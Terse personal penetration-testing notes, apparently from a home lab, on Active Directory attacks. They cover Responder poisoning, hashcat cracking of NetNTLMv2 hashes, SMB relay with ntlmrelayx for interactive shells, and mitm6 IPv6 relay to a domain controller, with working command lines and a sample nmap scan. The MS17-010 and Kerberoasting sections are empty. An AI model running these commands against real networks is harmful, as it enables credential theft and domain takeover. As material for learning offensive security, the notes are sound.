
 **1 Netbios && LLMNR Name Poisoning**\
 **2 Relay Attacks**\
 **3 MITM6**\
 **4 MS17-010**\
 **5 Kerberoasting**

---

**1. LLMNR (link local multicasting name resolution:: basically DNS) Poisoning:**\
       - needs traffic - ideal before nmap/nessus scans\
       - responder: 'python /usr/share/responder/Responder.py -L eth0 -rdwv'\
   a) try to access attacker IP address. see ![llmnr_poison](E:\Users\Carl\Documents\Notes\Ethical\Screenshots\admin_malz_llmnr_poison.png)\
       -  'hashcat -m 5600 windowshash.txt /usr/share/wordlists/rockyou.txt'  # --m 5600 module for NetNTLMv2\

---

**2. SMB Relay attacks:**\
       - Requirements:: SMB signing must be disabled, relayed user creds must be admin on machine, && network sharing enabled\
       - setup ntlmrelay see ![ntlmrelay.py](E:\Users\Carl\Documents\Notes\Ethical\Screenshots\ntlmrelay_py.png)\
   a) Find machines w/ smb enabled:\
        'nessus or nmap:: 'nmap --script=smb2-security-mode.nse -p445 192.168.86.0/24'\
            Nmap scan report for oxytocin-dc.lan (192.168.86.205)  (DC)\
            PORT    STATE SERVICE\
            445/tcp open  microsoft-ds\
            Host script results:\
            | smb2-security-mode:\
            |   2.02:\
            |_    Message signing enabled and required'\
   'python3 ntlmrelayx.py -tf targets.txt -smb2support (-i)'  'python3 -m pip install .' for install && -i interactive shell"\
       - Working but keeps failing:: see ![revmalz](Screenshots/revshell_smb_malz.png) && ![break](Screenshots/malz_smb_breaking.png)\
       - For shells W/ creds: ![shells](E:\Users\Carl\Documents\Notes\Ethical\Screenshots\meterpreter_psexec_shells.png)\
               #wmiexec.py && smbexec.py first! psexec and smb metepreter is very noisy##\

---

**3. Pv6 Attacks: DNS relay:**\
    # requirements, must have certificate in DC\
       #manage -> add role/feature -> next(3x) -> AD cert services -> CA -> next && restart -> install -> validity period 99yrs\
       -'sudo python3 mitm6.py -d carbon.local'\
       -'sudo python3 ntlmrelayx.py -6 -t ldaps://192.168.86.205 -wh fakewpad.carbon.local -l lootme'\
       - see ![IPv6_relay](E:\Users\Carl\Documents\Notes\Ethical\Screenshots\relay_ipv6.png)\

---

4. MS17-010\

---

5. \
 
[tutorial] (https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)\
[PW list] (https://github.com/danielmiessler/SecLists/tree/master/Passwords)\
[impacket] (https://github.com/SecureAuthCorp/impacket)\
[mitm6] (https://github.com/dirkjanm/mitm6)\
